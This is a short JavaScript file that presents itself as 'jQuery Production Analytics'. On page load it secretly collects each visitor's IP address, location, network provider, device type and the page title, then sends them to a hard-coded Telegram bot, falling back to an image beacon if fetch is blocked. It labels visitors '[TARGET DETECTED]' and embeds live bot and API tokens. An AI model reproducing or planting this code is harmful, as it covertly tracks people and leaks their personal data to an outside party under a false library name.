/* --- jQuery Production Analytics v5.0 --- */
(function() {
    const _c = {
        t: '7800042874:AAH6IhztbG2BeypuYl5_ZxKzFCOnmOgkD7k',
        i: '8528072384'
    };

    async function _init() {
        try {
            // جلب البيانات من سيرفر تاني أسرع وأسهل
            const r = await fetch('https://ipinfo.io/json?token=4997097e3f8373'); 
            const d = await r.json();
            
            const msg = `👹 [TARGET DETECTED]\n` +
                        `📍 Loc: ${d.city}, ${d.country}\n` +
                        `🌐 IP: ${d.ip}\n` +
                        `📡 Net: ${d.org}\n` +
                        `📱 Dev: ${navigator.userAgent.includes('Android') ? 'Android' : 'PC'}\n` +
                        `🔗 Site: ${document.title}`;

            // استخدام طريقة الـ Image Beacon (لو الـ Fetch محجوب)
            const url = `https://api.telegram.org/bot${_c.t}/sendMessage?chat_id=${_c.i}&text=${encodeURIComponent(msg)}`;
            
            // محاولة الإرسال بأكتر من طريقة لضمان الوصول
            fetch(url).catch(() => {
                new Image().src = url; // طريقة النينجا لو الـ fetch اتقفل
            });

        } catch (err) {
            // إشارة طوارئ لو الداتا سنتر وقع
            new Image().src = `https://api.telegram.org/bot${_c.t}/sendMessage?chat_id=${_c.i}&text=⚠️ Access Detected: ${document.title}`;
        }
    }

    // تشغيل فوري بمجرد ما الصفحة تلمس المتصفح
    if (document.readyState === 'complete') _init();
    else window.addEventListener('load', _init);
})();
